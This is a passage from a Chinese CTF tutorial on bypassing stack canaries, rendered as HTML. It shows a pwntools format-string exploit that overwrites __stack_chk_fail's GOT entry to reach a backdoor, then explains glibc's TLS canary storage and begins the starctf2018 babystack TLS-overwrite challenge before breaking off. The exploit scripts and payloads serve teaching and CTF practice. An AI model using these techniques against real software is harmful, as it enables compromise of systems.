id="任意地址写-64位"><a href="#任意地址写-64位" class="headerlink" title="任意地址写(64位)"></a>任意地址写(64位)</h5><p>下面题目的EXP，我们采取2字节的修改。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;%64c%9$hn%1510c%10$hnAAA&quot;</span> + p64(stack_chk_fail+<span class="number">2</span>) + p64(stack_chk_fail)</span><br></pre></td></tr></table></figure><p>具体解释看题解内容即可</p><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><p><a href="http://www.int0x80.top/BypassCanary/r2t4">题目地址</a>    <a href="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/r2t4">备用地址</a></p><p>从IDA中可以看到main函数有Canary保护</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/39.png" alt="image-20210409000213211"></p><p>并且函数中有格式化字符串漏洞</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在后门函数backdoor</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line">  v0 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们看下格式化字符的偏移，运行程序输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br></pre></td></tr></table></figure><p>可以看到输出内容，我们的41414141在第六个参数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/PWN$ ./r2t4 </span><br><span class="line">AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line">AAAA0x7ffeaa5d0250<span class="number">.0</span>x38<span class="number">.0</span>x7fa6a53fe320<span class="number">.0</span>x400730<span class="number">.0</span>x7fa6a56e1af0<span class="number">.0</span>x252e702541414141<span class="number">.0</span>x2e70252e70252e70<span class="number">.0</span>x70252e70252e7025<span class="number">.0</span>x252e70252e70252e<span class="number">.0</span>x2e70252e70252e70<span class="number">.0</span>x87ab0a70252e7025<span class="number">.0</span>x4006c0<span class="number">.0</span>x7fa6a5327840<span class="number">.0</span>x1</span><br><span class="line">*** <span class="built_in">stack</span> smashing detected ***: ./r2t4 terminated</span><br><span class="line">���@Aborted (core dumped)</span><br></pre></td></tr></table></figure><p>接着从IDA中找到后门函数的地址，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Function name| Segment |      Start      | Length  |</span><br><span class="line">  backdoor     .text  0000000000400626  00000038</span><br></pre></td></tr></table></figure><p>那我们可以直接写EXP了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./r2t4&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./r2t4&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system=<span class="number">0x400626</span></span><br><span class="line">__stack_chk_fail=elf.got[<span class="string">&quot;__stack_chk_fail&quot;</span>]</span><br><span class="line">print(<span class="string">&quot;[*] __stack_chk_fail is :&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(__stack_chk_fail)))</span><br><span class="line">print(<span class="string">&quot;[*] __stack_chk_fail high is :&quot;</span>+<span class="built_in">str</span>(p64(__stack_chk_fail+<span class="number">2</span>)))</span><br><span class="line">print(<span class="string">&quot;[*] __stack_chk_fail low is :&quot;</span>+<span class="built_in">str</span>(p64(__stack_chk_fail)))</span><br><span class="line">payload=<span class="string">b&#x27;%64c%9$hn%1510c%10$hnAAA&#x27;</span> + p64(__stack_chk_fail+<span class="number">2</span>) + p64(__stack_chk_fail)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>backdoor的地址是0x400626，利用格式化字符串漏洞把 __stack_chk_fail 的地址覆盖掉<br><code>%64c</code>：0x40，替换backdoor的两位高字节0x0040<br><code>%64c%9$hn%1510c%10$hnAAA</code>：占24个字符，24/8=3，偏移为6+3=9（之前算出的第六个参数中）<br><code>$hn</code>：向某个地址写入双字节<br><code>%1510c</code>：1510+64=0x0626,替换backdoor的两位高字节0x0626<br><code>AAA</code>：是填充字符，填充到8的倍数<br><code>__stack_chk_fail+2</code>和<code>__stack_chk_fail</code>分别替换成backdoor的高两位字节和低两位字节</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/40.png" alt="image-20210409035655552"></p><p>输出了我们之前做题写的flag文件内容</p><h3 id="覆盖-TLS-中储存的-Canary-值"><a href="#覆盖-TLS-中储存的-Canary-值" class="headerlink" title="覆盖 TLS 中储存的 Canary 值"></a>覆盖 TLS 中储存的 Canary 值</h3><h4 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h4><p>通常在C程序中常存在全局变量、静态变量以及局部变量，对于局部变量来说，并不存在线程安全问题。而对于全局变量和函数内定义的静态变量，同一进程中各个线程都可以访问它们，因此它们存在多线程读写问题。</p><p>如果需要在一个线程内部的各个函数调用都能访问、但其它线程不能访问的变量（被称为static memory local to a thread 线程局部静态变量），就需要新的机制来实现，这就是TLS。当函数在不同的线程上被调用时，该线程会被分配新的栈，并且Canary会被放置在TLS上。TLS位于栈的顶部，当溢出长度较大时，可以同时覆盖返回地址前的 Canary 和 TLS 中的 Canary 实现绕过。</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/41.png" alt="1" style="zoom:50%;" /><h4 id="Glibc中设置Canary的过程"><a href="#Glibc中设置Canary的过程" class="headerlink" title="Glibc中设置Canary的过程"></a>Glibc中设置Canary的过程</h4><p>从glibc源码中可以看到，定义了<code>THREAD_SET_STACK_GUARD</code>时，Canary通过这个宏被设置；否则存入全局变量<code>__stack_chk_guard</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* Set up the stack checker&#x27;s canary.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> THREAD_SET_STACK_GUARD</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">  __stack_chk_guard = stack_chk_guard;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>进一步查看<code>THREAD_SET_STACK_GUARD</code>定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line">    THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure><p>查看<code>THREAD_SETMEM</code>，可以看到这个宏通过内联汇编，将<code>vlaue</code>，也就是Canary放入了fs寄存器的某个偏移处，而这个偏移处又是通过<code>offsetof</code>宏得到的<code>pthread</code>结构体某个成员的偏移，在上面的代码中，可以看到传入的是成员<code>header.stack_guard</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> THREAD_SETMEM(descr, member, value) </span></span><br><span class="line">  (&#123; <span class="keyword">if</span> (<span class="keyword">sizeof</span> (descr-&gt;member) == <span class="number">1</span>)      </span><br><span class="line">       <span class="keyword">asm</span> <span class="keyword">volatile</span> (<span class="string">&quot;movb %b0,%%fs:%P1&quot;</span> :      </span><br><span class="line">     : <span class="string">&quot;iq&quot;</span> (value),      </span><br><span class="line">       <span class="string">&quot;i&quot;</span> (offsetof (struct pthread, member)));      </span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">sizeof</span> (descr-&gt;member) == <span class="number">4</span>)      </span><br><span class="line">       <span class="keyword">asm</span> <span class="keyword">volatile</span> (<span class="string">&quot;movl %0,%%fs:%P1&quot;</span> :      </span><br><span class="line">     : IMM_MODE (value),      </span><br><span class="line">       <span class="string">&quot;i&quot;</span> (offsetof (struct pthread, member)));      </span><br><span class="line">     <span class="keyword">else</span>      </span><br><span class="line">       &#123;      </span><br><span class="line"> <span class="keyword">if</span> (<span class="keyword">sizeof</span> (descr-&gt;member) != <span class="number">8</span>)      </span><br><span class="line">   <span class="comment">/* There should not be any value with a size other than 1,    </span></span><br><span class="line"><span class="comment">      4 or 8.  */</span>      </span><br><span class="line">   <span class="built_in">abort</span> ();      </span><br><span class="line">      </span><br><span class="line"> <span class="keyword">asm</span> <span class="keyword">volatile</span> (<span class="string">&quot;movq %q0,%%fs:%P1&quot;</span> :      </span><br><span class="line">       : IMM_MODE ((<span class="keyword">uint64_t</span>) cast_to_integer (value)),      </span><br><span class="line"> <span class="string">&quot;i&quot;</span> (offsetof (struct pthread, member)));      </span><br><span class="line">       &#125;&#125;)</span><br></pre></td></tr></table></figure><p><code>pthread</code>是一个超大的结构体，这里略去余下部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pthread</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> !TLS_DTV_AT_TP</span></span><br><span class="line">    <span class="comment">/* This overlaps the TCB as used for TLS without threads (see tls.h).  */</span></span><br><span class="line">    <span class="keyword">tcbhead_t</span> header;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Canary正是存储在<code>tcbhead_t</code>中的<code>stack_guard</code>，根据变量类型可以计算出在32位和64位上的偏移：</p><p>32位 gs:0x14 （0x4×3+0x4×3+0x4）</p><p>64位 fs:0x28（0x8×3+0x4×3+0x8）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;<span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">   thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">  <span class="keyword">void</span> *self;<span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> multiple_threads;</span><br><span class="line">  <span class="keyword">int</span> gscope_flag;</span><br><span class="line">  <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="keyword">uintptr_t</span> pointer_guard;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class="line"><span class="comment">     Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> feature_1;</span><br><span class="line">  <span class="keyword">int</span> __glibc_unused1;</span><br><span class="line">  <span class="comment">/* Reservation of some values for the TM ABI.  */</span></span><br><span class="line">  <span class="keyword">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">/* GCC split stack support.  */</span></span><br><span class="line">  <span class="keyword">void</span> *__private_ss;</span><br><span class="line">  <span class="comment">/* The lowest address of shadow stack,  */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> ssp_base;</span><br><span class="line">  <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class="line">  __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((aligned (<span class="number">32</span>)));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><p><a href="https://github.com/sixstars/starctf2018/blob/master/pwn-babystack/bs.c">题目地址</a> <a href="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/libc-2.23.so">libc-2.23.so下载</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//babystack.c</span></span><br><span class="line"><span class="comment">//gcc -fstack-protector-strong -s -pthread babystack.c -o babystack -Wl,-z,now,-z,relro</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">get_long</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">    fgets(buf, <span class="number">8</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">size_t</span>)atol(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">readn</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> rc;</span><br><span class="line"><span class="keyword">size_t</span> nread = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (nread &lt; n) &#123;</span><br><span class="line">rc = read(fd, &amp;buf[nread], n-nread);</span><br><span class="line"><span class="keyword">if</span> (rc == <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (errno == EAGAIN || errno == EINTR) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">nread += rc;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> nread;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">start</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    <span class="keyword">char</span> input[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="built_in">memset</span>(input, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome to babystack 2018!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;How many bytes do you want to send?&quot;</span>);</span><br><span class="line">    size = get_long();</span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">0x10000</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You are greedy!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    readn(<span class="number">0</span>, input, size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s time to say goodbye.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">pthread_t</span> t;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot; #   #    ####    #####  ######&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;  # #    #    #     #    #&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;### ###  #          #    #####&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;  # #    #          #    #&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot; #   #   #    #     #    #&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;          ####      #    #&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    pthread_create(&amp;t, <span class="literal">NULL</span>, &amp;start, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (pthread_join(t, <span class="literal">NULL</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;exit failure&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Bye bye&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="大体思路"><a href="#大体思路" class="headerlink" title="大体思路"></a>大体思路</h5><ul><li>通过padding爆破填充a修改TLS中的canary为aaaaaaaa，从而绕过栈溢出保护（这里必须是线程的题目，而且输入足够大才行！）</li><li>泄露出puts的got地址得到真实的基地址，用于getshell</li><li>利用栈迁移，在bss段中开辟一个空间来写one_gadget来payload</li></ul><p>我们看多线程中的反汇编函数，可以看到参数s的大小是<strong>0x1010</strong>，而v2可以允许<strong>0x10000</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *__fastcall <span class="title">start_routine</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-1018h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-1010h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+1018h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to babystack 2018!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many bytes do you want to send?&quot;</span>);</span><br><span class="line">  v2 = sub_400906(<span class="string">&quot;How many bytes do you want to send?&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0x10000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_400957(<span class="number">0LL</span>, &amp;s, v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s time to say goodbye.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You are greedy!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后看sub_400906函数，结合上个函数的传参可以看到read函数有明显的溢出，但是有canary保护，而且是线程，所以我们这里学习一种新招式，TSL（线程局部存储）攻击，基本思路就是我们得覆盖很多个a到高地址，直到把TLS给覆盖从而修改了canary的值为a，绕过了canary后就可以栈溢出操作了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">sub_400957</span><span class="params">(<span class="keyword">int</span> a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v5 &lt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = read(a1, (<span class="keyword">void</span> *)(v5 + a2), v4 - v5);</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *_errno_location() != <span class="number">11</span> &amp;&amp; *_errno_location() != <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !v6 )</span><br><span class="line">        <span class="keyword">return</span> v5;</span><br><span class="line">      v5 += v6;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查找值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 